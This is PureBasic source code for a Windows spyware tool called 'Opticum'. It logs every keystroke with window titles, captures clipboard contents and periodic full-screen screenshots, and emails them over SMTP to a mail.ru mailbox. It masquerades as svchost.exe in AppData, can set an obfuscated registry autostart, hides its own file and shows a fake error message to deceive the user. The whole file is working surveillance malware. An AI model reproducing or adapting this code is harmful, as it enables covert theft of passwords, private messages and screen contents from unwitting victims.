; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
; Opticum: remote optical linker v0.3
; Developed in 2014 by Guevara-chan. 
; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

EnableExplicit : UseJPEGImageEncoder() : InitNetwork() 

;{ -<Constants>-
#RegRunBranch = "㉳佣㕳朵癍䭬㐰㔲䩊䌷祆㥒呇匫敏午橮戳歴㥃婸䑪䌯䱪䡥呴煦唯收潗䌫䵰㙃渶夳⽦㑓稯楍硩猰ぬ䠱儹佧癒慶㐱浯穆楔㈱䨳睎佨乍晷灺剉噩潑㵷"
#CAPTUREBLT = $40000000 : #Mask = "svchost.exe" : #Key = "PB_00" 
#BufferStep = 1024 : #keyBits = 128 : #keySize = #keyBits / 8 : #filler = '=' ; official Base64 fill character
#ShotTimer = 0 : #Second = 1000 : #Minute = #Second * 60
; =Configuration=
#MailUser = "I Am Error" : #MailServer = "mail.ru" : #MailBox = #MailUser + "@" + #MailServer ; #DATA EXPENGED
#SelfInject = #False : #ScreenTime = 2 * #Minute : #MaxShots = 10 : #MaxFails = 6
CompilerIf #PB_Compiler_Version => 540 : #Port = 465 : CompilerElse : #Port = 2525 : CompilerEndIf
;}
;{ -<Structurality>-
Structure DataEntry
*DataPtr
Naming.s
EndStructure

Structure KeyMap : StructureUnion : Code.C : Char.S{1} : EndStructureUnion : Map.a[256] : EndStructure
;}
;{ -<Definitions>-
NewList Attachments.DataEntry()
NewList *Mails()
Global *Buffer, *Outer
;}
;{ -<Fusion procedurality>-
Macro ResetBuffer() ; Pseudo-procedure.
If *Buffer : FreeMemory(*Buffer) : EndIf : *Buffer = AllocateMemory(#BufferStep) : *Outer = *Buffer
EndMacro

Procedure LogOut(Text.s)
Define BSize = MemorySize(*Buffer), TextSize = StringByteLength(Text, #PB_UTF8) + SizeOf(Character), Shift = *Outer - *Buffer
If Shift + TextSize > BSize : *Buffer = ReAllocateMemory(*Buffer, BSize + (TextSize / #BufferStep + 1) * #BufferStep) 
*Outer = *Buffer + Shift    : EndIf : *Outer + PokeS(*Outer, Text, -1, #PB_UTF8)
EndProcedure

Procedure LogOutN(Text.s) ; <_< (no second step of macro expansion).
LogOut(Text + #CRLF$)
EndProcedure

Procedure.s GetWinTitle(*hWnd)
Define TitleSize = GetWindowTextLength_(*hwnd), Result.s = Space(TitleSize)    ; Готовим аккумулятор.
GetWindowText_(*hWnd, @Result, TitleSize+1) : ProcedureReturn Result           ; Списываем сам заголовок.
EndProcedure

Macro MonitorString(ProtoAccum, MetaAccum, Methodic, LogEntry, AcceptEmpty = #True) ; Pseudo-procedure.
Define.s ProtoAccum, MetaAccum = Methodic                                      ; Инциализация значений.
If MetaAccum <> ProtoAccum And (AcceptEmpty Or MetaAccum)                      ; Проверка на изменения.
ProtoAccum = MetaAccum  : LogOutN(#CRLF$+LogEntry) : EndIf                     ; Логируем итоговое значение.
EndMacro

Macro DateFormat(Datum = Date()) ; Pseudo-procedure.
FormatDate("%dd.%mm.%yyyy--%hh`%ii`%ss", Datum)
EndMacro

Procedure.s NormalizeClip(Clip.s)
If Len(Clip) > #MAX_PATH : ProcedureReturn Left(Clip, #MAX_PATH) + LSet("", 3, "●") : EndIf ; Обрезаем, если и правда оно как-то избыточно.
ProcedureReturn Clip                                                           ; Ну или не обрезаем... Дело хозяйское
EndProcedure

Macro SessionID() : ComputerName() + "〚⇛〛" + UserName() : EndMacro
Macro Specialize(Char) : "『" + Char + "』" : EndMacro                                                                         ; Partializer.
Macro SpecialOut(Char) : LogOut(Specialize(Char)) : EndMacro                                                                 ; Partializer.
Macro MonitorWin(WinPtr=GetForegroundWindow_()):MonitorString(Title,NewTitle,GetWinTitle(WinPtr),"=►["+Title+"]◄="):EndMacro ; Partializer.
Macro CheckState(Accum, Memo) : If Accum : PState + Memo + "+" : EndIf : EndMacro                                            ; Partializer.
Macro CheckMod(Code) : Bool(Keys\Map[#VK_#Code] & $80) : EndMacro 

Macro KeyCase(Code, Memo = "", NewLine =) ; Partializer.
Case Code : If Memo <> "" : LogOut#NewLine(Specialize(TakeStates(#True) + Memo)) : EndIf 
EndMacro

Procedure.s TakeStates(CheckShift = #True) ; Практически partializer, но...
Global Alt, Ctrl, Shift, PState.s = ""
CheckState(Ctrl, "CRTL") : CheckState(Alt, "ALT") : If CheckShift : CheckState(Shift, "SHIFT") : EndIf
ProcedureReturn PState
EndProcedure

Procedure AsyncStateEX(Code)
Static Archive.KeyMap, I
Define State = Bool(GetAsyncKeyState_(Code) & -$8000), OldState = Archive\Map[Code]
Archive\Map[Code] = State : ProcedureReturn Bool(State = 0 And OldState)
EndProcedure
;}
;{ -<Legacy procedurality>-
CompilerIf #PB_Compiler_Version => 560 ; Не было печали - апдейтов накачали !
Macro Base64Decoder(InputBuffer, InputSize, OutputBuffer, OutputSize) 
Base64DecoderBuffer(InputBuffer, InputSize, OutputBuffer, OutputSize)
EndMacro

Macro Base64Encoder(InputBuffer, InputSize, OutputBuffer, OutputSize) 
Base64EncoderBuffer(InputBuffer, InputSize, OutputBuffer, OutputSize)
EndMacro
CompilerEndIf

Procedure AES_size(*b64)
; calculates and returns the number of bytes in the cypher
; from the number of bytes in the Base64 string
Define n = MemoryStringLength(*b64) * SizeOf(character)
*b64 + n            ; move pointer to last byte of string
n = (n / 4) * 3     ; 3 AES bytes for each 4 Base64 bytes
If PeekB(*b64-2) = #filler : n - 2 : ElseIf PeekB(*b64-1) = #filler : n - 1 : EndIf
ProcedureReturn n
EndProcedure

Procedure.s Decypher(strB64.s, key.s)
Define n, n64, *aesBuffer
Define.s str    ; return value
;(1) extract the AES cypher from the Base64 string
n = StringByteLength(strB64)
*aesBuffer = AllocateMemory(n)
Base64Decoder(@strB64, n, *aesBuffer, n)
;(2) decypher AES buffer to recover original expression
n = AES_size(@strB64)   ; number of bytes in the cypher
str = Space(n)
AESDecoder(*aesBuffer, @str, n, @key, #keyBits, 0, #PB_Cipher_ECB)
FreeMemory(*aesBuffer)
ProcedureReturn str
EndProcedure 

CompilerIf #SelfInject ; Если требуется самостоятельная инъекция.
Procedure RegSetStr(hKey, SubKey.S, ValueName.S, Dat.S)
Define *Hnd
RegCreateKeyEx_(hKey, @SubKey, 0, 0, 0, #KEY_WRITE, 0, @*Hnd, 0)
RegSetValueEx_(*Hnd, @ValueName, 0, #REG_SZ, @Dat, StringByteLength(Dat))
RegCloseKey_(*Hnd)
EndProcedure

Procedure.s CombinePaths(MainPath.s, Addition.s)
Define Result.S{#MAX_PATH}
PathCombine_(@Result, @MainPath, @Addition)
ProcedureReturn Result
EndProcedure

Procedure.s GetSpecialPath(ID)
Define Result.s{#MAX_PATH}
SHGetFolderPath_(#Null, ID, #SHGFP_TYPE_CURRENT, 0, @Result)
ProcedureReturn Result
EndProcedure

Procedure BWCopyFile(SrcFile.s, DestFile.s)
Define *SrcID  = ReadFile(#PB_Any, SrcFile)    : If *SrcID
Define *DestID = CreateFile(#PB_Any, DestFile) : If *DestID
Define FileSize = Lof(*SrcID), *Buffer = AllocateMemory(FileSize)
WriteData(*DestID, *Buffer, ReadData(*SrcID, *Buffer, FileSize))
FreeMemory(*Buffer) : CloseFile(*DestID) : ProcedureReturn #True : EndIf 
CloseFile(*SrcID) : EndIf
EndProcedure

Macro DQT(Text) ; Pseudo-procedure.
#DQUOTE$ + Text + #DQUOTE$
EndMacro
;}
; =<Pre-init>=
Define TPath.s = CombinePaths(GetSpecialPath(#CSIDL_APPDATA), #Mask) : If LCase(ProgramFilename()) <> LCase(TPath) ; Проверяем, откуда запуск.
SetFileAttributes(TPath, #PB_FileSystem_Normal) : If BWCopyFile(ProgramFilename(), TPath) : RunProgram(TPath)      ; Снимаем защиту и копируем.
MessageRequester("-=[Data resender]=-", "Unable to send test data [" + ComputerName() + "] !", #MB_ICONERROR)      ; Просто так :3.
End : EndIf : Else : RegSetStr(#HKEY_CURRENT_USER, Decypher(#RegRunBranch, #key), Decypher("穵㝡灲剪⭘圵乗洶極睮汏塖㑉䱅塋塥䱪䱙䱥啹眹灘奏楗剳㴸", #Key),
DQT(ProgramFilename()))                                                                                            ; Не забываем автозапуск.
SetFileAttributes(ProgramFilename(), #PB_FileSystem_Hidden | #PB_FileSystem_System)                                ; Скрываем->запускаем.
EndIf : CompilerEndIf                                                                                              ; А теперь - стандарт:
; -----
; =<Initialization>=
Repeat : Define Mutex = CreateMutex_(0, 0, "[Opticaes_EX]") : If Mutex : Break : Else : Delay(100) : EndIf : ForEver
If GetLastError_() : End : EndIf                               ; Это всегда плохая идея - запускать две копии логгера.
Define *MyThread = GetCurrentThreadId_(), Keys.KeyMap, I, *Mail : ResetBuffer()        ; Получаем данные для полноты слежения.
LogOut(FormatDate(#CRLF$ + "==►" + SessionID() + ": %dd/%mm/%yyyy, %hh:%ii - new session begun.", Date())) ; Старт сесии.
OpenWindow(0, 0, 0, 0, 0, "", #PB_Window_Invisible)                                    ; Незримое окно приема сообщений.
AddWindowTimer(0, #ShotTimer, #ScreenTime) : PostEvent(#PB_Event_Timer, 0, #ShotTimer) ; Таймеры до переброса.
Define ShotCount = #MaxShots                                                           ; Отмечаем, что уже пора ставить.
; =<Main loop>=
Repeat : Delay(5)                                                                      ; Forever loop.
; =Fusion part=
For I = 8 To #MAXBYTE                    ; Проверяем все клавиши.
If AsyncStateEX(I)                       ; Если клавиша отжата....
Define *Win = GetForegroundWindow_()     ; Получаем активное окно.
Define *Thread = GetWindowThreadProcessId_(*Win, 0) ; Получаем поток активного окна.
Define Lay = GetKeyboardLayout_(*Thread) ; Клавиатурная раскладка активного окна.
AttachThreadInput_(*MyThread, *Thread, #True)   ; Объединение входных потоков.
GetKeyboardState_(@Keys\Map) : MonitorWin(*Win) ; Получаем состояние клавиатуры.
; ---
Global Alt = CheckMod(MENU), Shift = CheckMod(SHIFT), Ctrl = CheckMod(CONTROL) : Keys\Map[#VK_CONTROL] = #False ; Запоминаем все.
Select I ; Обрабатываем специальные случаи для пущей красивости:
; ---
KeyCase(#VK_BACK    , "BCK")    : KeyCase(#VK_TAB   , "TAB")   : KeyCase(#VK_ESCAPE, "ESC")  : KeyCase(#VK_PRIOR , "PGUP")
KeyCase(#VK_NEXT    , "PGDN")   : KeyCase(#VK_END   , "END")   : KeyCase(#VK_HOME  , "HOME") : KeyCase(#VK_LEFT  , "LEFT")
KeyCase(#VK_UP      , "UP")     : KeyCase(#VK_RIGHT , "RIGHT") : KeyCase(#VK_DOWN  , "DOWN") : KeyCase(#VK_DELETE, "DEL")
KeyCase(#VK_SNAPSHOT, "PRTSCN") : KeyCase(#VK_PAUSE , "PAUSE") : KeyCase(#VK_LWIN  , "LWIN") : KeyCase(#VK_RWIN  , "RWIN")
KeyCase(#VK_APPS    , "APPS")   : KeyCase(#VK_F1 To #VK_F12, "F" + Str(I - #VK_F1 + 1)) ; Основные клавиши идут тут, дальше - лирика:
KeyCase(#VK_CONTROL) : KeyCase(#VK_MENU)  : KeyCase(#VK_SHIFT) : KeyCase(#VK_LCONTROL)  : KeyCase(#VK_RCONTROL) : KeyCase(#VK_LSHIFT) 
KeyCase(#VK_RSHIFT)  : KeyCase(#VK_LMENU) : KeyCase(#VK_RMENU) ; Заглушки для всего того, что нам не нужно.
KeyCase(#VK_INSERT  , "INS") : KeyCase(#VK_RETURN, "ENTER", N) : Default ; Иначе - стандартная процедура приведения код к символу.
; ---
If ToUnicodeEx_(I, MapVirtualKey_(I, 0), @Keys\Map, @Keys\Code, SizeOf(Keys\Code), #Null, Lay) > 0 ; Преобразуем же.
Define FinalOut.s = TakeStates(#False) : If FinalOut : FinalOut = Specialize(FinalOut + Keys\Char) : Else : FinalOut = Keys\Char : EndIf
LogOut(FinalOut) : Else : LogOut(Specialize("?")) : EndIf  : EndSelect : EndIf                     ; Выводим, что у нас в итогах получилось.
; Основная часть заканчивается здесь, дальше идет слежение за буфером и скриншоты:
Next I : MonitorString(Clip, NewClip, GetClipboardText(), "【◆►►"+NormalizeClip(NewClip)+"◄◄◆】", #False) ; Немного буффера обмена.
; =Legacy part=
If WindowEvent() = #PB_Event_Timer                                                  ; Проверяем, не пора ли снимать снимки.
ExamineDesktops() : With Attachments()                                              ; Первичная подготовка.
Define ScreenDC = GetDC_(#Null) : CreateImage(0, DesktopWidth(0), DesktopHeight(0)) ; Готовим поверхности.
BitBlt_(StartDrawing(ImageOutput(0)), 0, 0, ImageWidth(0), ImageHeight(0), ScreenDC, 0, 0, #SRCCOPY|#CAPTUREBLT) ; Cтандартный перенос.
ReleaseDC_(#Null, ScreenDC) : StopDrawing() : AddElement(Attachments())             ; Записываем данные для вложения.
\Naming = FormatDate(DateFormat() + ".jpg", Date())                                 ; Формируем название снимка.
\DataPtr = EncodeImage(0, #PB_ImagePlugin_JPEG, 4) : FreeImage(0) : MonitorWin()    ; Сжимаем до состояний .JPG
LogOutN(#CRLF$ + "▲▼screen/" + GetFilePart(\Naming) + "/shot▼▲") : ShotCount + 1   ; Не забываем докинуть в лог.
If ShotCount => #MaxShots : Define FailCount                                        ; Пришло время отправлять письма !
*Mail = CreateMail(#PB_Any, #MailBox, ComputerName() + "/@/" + UserName() + FormatDate("/@/%dd.%mm.%yyyy, %hh:%ii", Date()))
If *Mail Or FailCount => #MaxFails                                                  ; Проверяем, есть ли смысл к работе.
AddMailRecipient(*Mail, #MailBox, #PB_Mail_To)                                      ; Выставляем адресата
ForEach Attachments() : AddMailAttachmentData(*Mail, \Naming, \DataPtr, MemorySize(\DataPtr), "image/jpeg") ; Собственно, посылка.
FreeMemory(\DataPtr) : Next : AddElement(*Mails()) : *Mails() = *Mail               ; Записываем в асинхронный список.
ClearList(Attachments()) : AddMailAttachmentData(*Mail, DateFormat() + ".txt", *Buffer, *Outer - *Buffer, "text/plain")
ResetBuffer() : SendMail(*Mail, "smtp." + #MailServer, #Port, #PB_Mail_Asynchronous | #PB_Mail_UseSSL, #MailBox, "I Am Error") ; DATA EXPUNGED
ShotCount = 0 : FailCount = 0 : Else : FailCount + 1 : EndIf : EndIf : EndWith : EndIf    ; Сбрасываем счетчики.                           
; ---
ForEach *Mails() : Select MailProgress(*Mails())                                    ; Обратываем отправленные письма.
Case #PB_Mail_Finished, #PB_Mail_Error : MailProgress(*Mails()): FreeMail(*Mails()) : DeleteElement(*Mails()) ; По окончании - удаляем из списка.
EndSelect : Next : ForEver
; IDE Options = PureBasic 5.70 LTS (Windows - x86)
; CursorPosition = 218
; FirstLine = 36
; Folding = xv-
; EnableUser
; Executable = ..\..\..\Users\Guevara-chan\Documents\rundll32.exe
; EnableUnicode